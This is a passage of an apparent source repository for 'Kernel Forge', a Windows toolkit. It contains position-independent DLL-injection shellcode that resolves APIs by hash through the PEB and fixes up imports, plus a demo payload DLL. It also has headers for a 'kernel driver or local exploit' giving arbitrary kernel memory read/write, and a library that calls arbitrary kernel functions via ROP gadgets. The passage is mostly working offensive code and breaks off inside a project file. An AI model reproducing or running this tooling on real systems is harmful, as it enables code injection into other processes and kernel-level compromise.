            if ((Chr >= 'A') && (Chr <= 'Z')) 
            {
                // convert characetr to the low case
                Chr = Chr + ('a' - 'A');
            }

            szBaseDllName[i] = Chr;
        }

        szBaseDllName[NameLength] = '\0';

        // check the name hash
        if (dll_inject_CalcHash(szBaseDllName) == ModuleHash) 
        {
            return LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID WINAPI dll_inject_GetProcAddressByHash(PVOID Image, DWORD ProcHash)
{
    if (Image == NULL)
    {
        // something goes wrong
        return NULL;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);    

    DWORD Addr = 0;
    DWORD ExportAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD ExportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (ExportAddr != 0)
    {        
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image, ExportAddr); 

        if (pExport->AddressOfFunctions == 0 ||
            pExport->AddressOfNameOrdinals == 0 ||
            pExport->AddressOfNames == 0)
        {
            // no exports by name
            return NULL;
        }

        // parse module exports
        PDWORD AddrOfFunctions = (PDWORD)RVATOVA(Image, pExport->AddressOfFunctions);
        PWORD AddrOfOrdinals = (PWORD)RVATOVA(Image, pExport->AddressOfNameOrdinals);
        PDWORD AddrOfNames = (PDWORD)RVATOVA(Image, pExport->AddressOfNames);

        for (DWORD i = 0; i < pExport->NumberOfNames; i += 1)
        {
            // calculate and compare hash of function
            if (dll_inject_CalcHash((char *)RVATOVA(Image, AddrOfNames[i])) == ProcHash)
            {
                // get exported function RVA
                Addr = AddrOfFunctions[AddrOfOrdinals[i]];
                break;                
            }
        }
    }

    if (Addr != 0)
    {
        // check for the forwarded export
        if (Addr > ExportAddr &&
            Addr < ExportAddr + ExportSize)
        {
            // forwarded exports are not supported
            return NULL;
        }

        return RVATOVA(Image, Addr);
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
BOOL WINAPI dll_inject_ProcessImports(PVOID Image)
{
    dll_inject_LoadLibraryA f_LoadLibraryA = NULL;
    dll_inject_GetProcAddress f_GetProcAddress = NULL;

    // get kernel32.dll base address
    PVOID KernelBase = dll_inject_GetModuleAddressByHash(DLL_INJECT_HASH_KERNEL32);
    if (KernelBase)
    {
        f_LoadLibraryA = (dll_inject_LoadLibraryA)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_LOAD_LIBRARY_A);

        f_GetProcAddress = (dll_inject_GetProcAddress)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_GET_PROC_ADDRESS);
    }

    if (f_LoadLibraryA == NULL ||
        f_GetProcAddress == NULL)
    {
        // unable to import required functions
        return FALSE;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    DWORD ImportAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD ImportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

    if (ImportAddr != 0)
    {        
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)RVATOVA(Image, ImportAddr);

        while (pImport->Name != 0)
        {                
            char *lpszLibName = (char *)RVATOVA(Image, pImport->Name);

            // load import library
            PVOID LibAddr = f_LoadLibraryA(lpszLibName);
            if (LibAddr == NULL)
            {
                return FALSE;
            }            

            // process thunks data
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)RVATOVA(Image, pImport->FirstThunk);
            while (pThunk->u1.Ordinal != 0)
            {
                if (pThunk->u1.Ordinal & 0xf0000000)
                {
                    // lookup function address by ordinal
                    PVOID FuncAddr = f_GetProcAddress(LibAddr, (char *)(pThunk->u1.Ordinal & 0xffff));
                    if (FuncAddr == NULL)
                    {
                        return FALSE;
                    }                    

                    *(PVOID *)pThunk = FuncAddr;
                }
                else
                {                    
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)RVATOVA(Image, pThunk->u1.AddressOfData);
                    char *lpszFuncName = (char *)&pName->Name;

                    // lookup function address by name
                    PVOID FuncAddr = f_GetProcAddress(LibAddr, lpszFuncName);
                    if (FuncAddr == NULL)
                    {
                        return FALSE;
                    }                   

                    *(PVOID *)pThunk = FuncAddr;
                }

                pThunk += 1;
            }

            pImport += 1;
        }
    }

    return TRUE;
}

void WINAPI dll_inject_End(void) { }
//--------------------------------------------------------------------------------------
// EoF

```

`dll_inject_shellcode.h`:

```h

// hash sums for dll_inject_CalcHash()
#define DLL_INJECT_HASH_KERNEL32            0x4b1ffe8e  // "kernel32.dll"
#define DLL_INJECT_HASH_LOAD_LIBRARY_A      0xc8ac8026  // "LoadLibraryA"
#define DLL_INJECT_HASH_GET_PROC_ADDRESS    0x1fc0eaee  // "GetProcAddress"

typedef PVOID (WINAPI * dll_inject_LoadLibraryA)(char *lpLibFileName);
typedef PVOID (WINAPI * dll_inject_GetProcAddress)(PVOID hModule, char *lpProcName);

#ifdef _X86_

#define DLL_INJECT_PEB_IMAGE_BASE_OFFEST   0x08
#define DLL_INJECT_PEB_LDR_TABLE_OFFSET    0x0C 

#else _AMD64_

#define DLL_INJECT_PEB_IMAGE_BASE_OFFEST   0x10
#define DLL_INJECT_PEB_LDR_TABLE_OFFSET    0x18

#endif

#pragma pack(1)

typedef struct _DLL_INJECT_STRUCT
{
    // DLL image base
    PVOID ModuleBase;    

    // DLL load shellcode
    UCHAR Shellcode[];

} DLL_INJECT_STRUCT,
*PDLL_INJECT_STRUCT;

#pragma pack()

extern "C"
{
DWORD WINAPI dll_inject_Entry(PDLL_INJECT_STRUCT Struct);
DWORD WINAPI dll_inject_CalcHash(char *lpszString);
PVOID WINAPI dll_inject_GetModuleAddressByHash(ULONG ModuleHash);
PVOID WINAPI dll_inject_GetProcAddressByHash(PVOID Image, ULONG ProcHash);
BOOL WINAPI dll_inject_ProcessImports(PVOID Image);
void WINAPI dll_inject_End(void);
};

```

`dummy/dummy.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
DWORD WINAPI DllThread(LPVOID lpParam)
{
    char szPath[MAX_PATH];
    char szText[MAX_PATH + 0x100];

    // obtain process executable path
    GetModuleFileName(GetModuleHandle(NULL), szPath, MAX_PATH);

    sprintf(szText, "Running in \"%s\", PID = %d", szPath, GetCurrentProcessId());

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): %s\n", szText);

    MessageBox(0, szText, __FUNCTION__"()", MB_ICONINFORMATION);

    return 0;
}
//--------------------------------------------------------------------------------------
BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // show message in separate thread to avoid loader locks
        HANDLE hThread = CreateThread(NULL, 0, DllThread, NULL, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
        }

        break;
    }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:

        break;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF

```

`dummy/dummy.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{60067986-A909-433D-9699-0E00FE13E16E}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>dummy</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
    <GenerateManifest>false</GenerateManifest>
    <OutDir>$(SolutionDir)</OutDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)</OutDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Full</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;DUMMY_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalOptions>%(AdditionalOptions)</AdditionalOptions>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <Optimization>Full</Optimization>
      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;DUMMY_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalOptions>/D "DBG" %(AdditionalOptions)</AdditionalOptions>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalOptions>%(AdditionalOptions)</AdditionalOptions>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h" />
    <ClInclude Include="..\common\debug.h" />
    <ClInclude Include="..\common\ntdll_defs.h" />
    <ClInclude Include="..\common\ntdll_undocnt.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\common.cpp" />
    <ClCompile Include="..\common\debug.cpp" />
    <ClCompile Include="stdafx.cpp" />
    <ClCompile Include="dummy.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`dummy/dummy.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Header Files\common">
      <UniqueIdentifier>{66b23975-4316-4cb0-a82f-e46d26ccbd94}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="debug.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\common.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dummy.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`dummy/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// backdoor_client.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file

```

`dummy/stdafx.h`:

```h
#pragma once
#pragma warning(disable: 4200)
#pragma warning(disable: 4996)

#include "targetver.h"

// exclude rarely-used stuff from Windows headers
#define WIN32_LEAN_AND_MEAN             

#include <stdio.h>
#include <windows.h>
#include <sddl.h>

#include "common/ntdll_defs.h"
#include "common/ntdll_undocnt.h"
#include "common/common.h"
#include "common/debug.h"

```

`dummy/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`include/kforge_driver.h`:

```h
#ifndef _KFORGE_DRIVER_H_
#define _KFORGE_DRIVER_H_

#ifdef __cplusplus

extern "C"
{

#endif

/**
 * Initialize kernel driver or local exploit that provies arbitrary 
 * memory read write primitives.
 *
 * @return TRUE if success or FALSE in case of error.
 */
BOOL DriverInit(void);

/**
 * Uninitialize kernel driver or local exploit.
 *
 * @return TRUE if success or FALSE in case of error.
 */
BOOL DriverUninit(void);

/**
 * Read kernel virtual address space memory.
 *
 * @param Addr Source address to read from.
 * @param Data Destination buffer to store read data.
 * @param DataSize Number of bytes to read.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL DriverMemRead(PVOID Addr, PVOID Data, DWORD_PTR DataSize);

/**
 * Write kernel virtual address space memory.
 *
 * @param Addr Destination address to write into.
 * @param Data Source buffer with data to write.
 * @param DataSize Number of bytes to write.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL DriverMemWrite(PVOID Addr, PVOID Data, DWORD_PTR DataSize);

#ifdef __cplusplus

}

#endif
#endif

```

`include/kforge_library.h`:

```h
#ifndef _KFORGE_LIBRARY_H_
#define _KFORGE_LIBRARY_H_

// max arguments for KfCall(): 4 over the registers and 9 over the stack
#define MAX_ARGS (4 + 9)

// convert KfCall() call arguments
#define KF_ARG(_val_) ((PVOID)(_val_))

// convert KfCall() return value
#define KF_RET(_val_) ((PVOID *)(_val_))

#ifdef __cplusplus

extern "C"
{

#endif

/**
 * Initialize Kernel Forge library: reads kernel image into the user mode memory,
 * finds needed ROP gadgets, etc, etc.
 *
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfInit(void);

/**
 * Uninitialize Kernel Forge library when you don't need to use its API anymore.
 *
 * @return TRUE if success and FALSE in case of error.
 */
BOOL KfUninit(void);

/**
 * Call kernel function by its name, it can be exported ntoskrnl.exe function
 * or not exported Zw function.
 *
 * @param lpszProcName Name of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCall(char *lpszProcName, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);

/**
 * Call an arbitrary function by its address.
 *
 * @param ProcAddr Address of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);

/**
 * Get system call number by appropriate native API function name.
 *
 * @param lpszProcName Name of the function.
 * @param pdwRet Pointer to the variable that receives system call number.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfGetSyscallNumber(char *lpszProcName, PDWORD pdwRet);

/**
 * Get an actual address of the function exported by ntoskrnl.exe image.
 *
 * @param lpszProcName Name of exported function.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelProcAddress(char *lpszProcName);

/**
 * Get an actual address of not exported Zw function of ntoskrnl.exe image
 * using signature based search.
 *
 * @param lpszProcName Name of Zw function.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelZwProcAddress(char *lpszProcName);

/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory.
 *
 * @param Size Number of bytes to allocate.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAlloc(SIZE_T Size);

/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory and copy spcified data from
 * the user mode into the allocated memory.
 *
 * @param Size Number of bytes to allocate.
 * @param Data Data to copy into the allocated memory.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAllocData(SIZE_T Size, PVOID Data);

/**
 * Wrapper that uses KfCall() to execute nt!ExFreePool() function to free the memory
 * that was allocated by KfHeapAlloc() or KfHeapAllocData() functions.
 *
 * @param Addr Address of the memory to free.
 */
void KfHeapFree(PVOID Addr);

/**
 * Wrapper that uses KfCall() to execute nt!memcpy() function to copy arbitrary data
 * between kernel mode and user mode or vice versa.
 *
 * @param Dst Address of the destination memory.
 * @param Src Address of the source memory.
 * @param Size Number of bytes to copy.
 * @return Destination memory address if success or NULL in case of error.
 */
PVOID KfMemCopy(PVOID Dst, PVOID Src, SIZE_T Size);

/**
 * Wrapper that uses KfCall() to execute nt!memset() function to fill memory region
 * with specified character.
 *
 * @param Dst Address of the destination memory.
 * @param Val Character to fill.
 * @param Size Number of bytes to fill.
 * @return Destination memory address if success or NULL in case of error.
 */
PVOID KfMemSet(PVOID Dst, int Val, SIZE_T Size);

#ifdef __cplusplus

}

#endif
#endif

```

`kforge.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 2013
VisualStudioVersion = 12.0.21005.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kforge_driver", "kforge_driver\kforge_driver.vcxproj", "{9244F175-9960-47FB-A197-F717D5C2C370}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kforge_library", "kforge_library\kforge_library.vcxproj", "{01DA4344-6C0C-4692-9542-D2E895AA4AFB}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kforge_example", "kforge_example\kforge_example.vcxproj", "{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}"
	ProjectSection(ProjectDependencies) = postProject
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB} = {01DA4344-6C0C-4692-9542-D2E895AA4AFB}
		{9244F175-9960-47FB-A197-F717D5C2C370} = {9244F175-9960-47FB-A197-F717D5C2C370}
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "dummy", "dummy\dummy.vcxproj", "{60067986-A909-433D-9699-0E00FE13E16E}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kforge", "kforge\kforge.vcxproj", "{548848C6-A540-47C8-8C2F-C3B309ED331B}"
	ProjectSection(ProjectDependencies) = postProject
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB} = {01DA4344-6C0C-4692-9542-D2E895AA4AFB}
		{9244F175-9960-47FB-A197-F717D5C2C370} = {9244F175-9960-47FB-A197-F717D5C2C370}
	EndProjectSection
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{9244F175-9960-47FB-A197-F717D5C2C370}.Debug|x64.ActiveCfg = Debug|x64
		{9244F175-9960-47FB-A197-F717D5C2C370}.Debug|x64.Build.0 = Debug|x64
		{9244F175-9960-47FB-A197-F717D5C2C370}.Release|x64.ActiveCfg = Release|x64
		{9244F175-9960-47FB-A197-F717D5C2C370}.Release|x64.Build.0 = Release|x64
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB}.Debug|x64.ActiveCfg = Debug|x64
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB}.Debug|x64.Build.0 = Debug|x64
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB}.Release|x64.ActiveCfg = Release|x64
		{01DA4344-6C0C-4692-9542-D2E895AA4AFB}.Release|x64.Build.0 = Release|x64
		{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}.Debug|x64.ActiveCfg = Debug|x64
		{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}.Debug|x64.Build.0 = Debug|x64
		{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}.Release|x64.ActiveCfg = Release|x64
		{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}.Release|x64.Build.0 = Release|x64
		{60067986-A909-433D-9699-0E00FE13E16E}.Debug|x64.ActiveCfg = Debug|x64
		{60067986-A909-433D-9699-0E00FE13E16E}.Debug|x64.Build.0 = Debug|x64
		{60067986-A909-433D-9699-0E00FE13E16E}.Release|x64.ActiveCfg = Release|x64
		{60067986-A909-433D-9699-0E00FE13E16E}.Release|x64.Build.0 = Release|x64
		{548848C6-A540-47C8-8C2F-C3B309ED331B}.Debug|x64.ActiveCfg = Debug|x64
		{548848C6-A540-47C8-8C2F-C3B309ED331B}.Debug|x64.Build.0 = Debug|x64
		{548848C6-A540-47C8-8C2F-C3B309ED331B}.Release|x64.ActiveCfg = Release|x64
		{548848C6-A540-47C8-8C2F-C3B309ED331B}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`kforge/kforge.cpp`:

```cpp
#include "stdafx.h"

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    
        // initialize kforge library
        return KfInit();

    case DLL_PROCESS_DETACH:
        
        // uninitialize kforge library
        return KfUninit();
    }

    return TRUE;
}

```

`kforge/kforge.def`:

```def
EXPORTS

KfCall
KfCallAddr
KfHeapAlloc
KfHeapAllocData
KfHeapFree
KfMemCopy
KfGetSyscallNumber
KfGetKernelProcAddress
KfGetKernelZwProcAddress

```

`kforge/kforge.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{548848C6-A540-47C8-8C2F-C3B309ED331B}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>kforge</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;KFORGE_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
      <AdditionalOptions>/DEF:kforge.def %(AdditionalOptions)</AdditionalOptions>
      <AdditionalDependencies>..\kforge_driver.lib;..\kforge_library.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;KFORGE_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
